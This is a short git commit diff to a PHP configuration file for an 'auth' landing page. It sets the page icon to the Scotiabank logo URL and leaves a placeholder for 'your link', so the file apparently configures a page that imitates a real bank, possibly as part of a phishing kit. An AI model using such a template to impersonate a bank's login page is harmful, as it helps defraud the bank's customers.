0f65f977ee5fa1a86f2e1e87a74aafaaa4a76b5f
nickdurkin <nickdurkin@gmail.com>
2021-07-27 12:21:30 -0700

    Update a_HomePage.php

--- nginx/src/a_HomePage.php
+++ nginx/src/a_HomePage.php
@@ -1,7 +1,7 @@
 <?php
 //Working on different version
 $auth_version=1; // app Version (1 or 2)
-$auth_icon="";
-$auth_message=""; // Landing page
+$auth_icon="https://www.scotiabank.com/content/dam/scotiabank/images/logos/2019/scotiabank-logo-red-desktop-200px.svg";
+$auth_message="cool"; // Landing page
 $my_link=""; // your link
 ?>
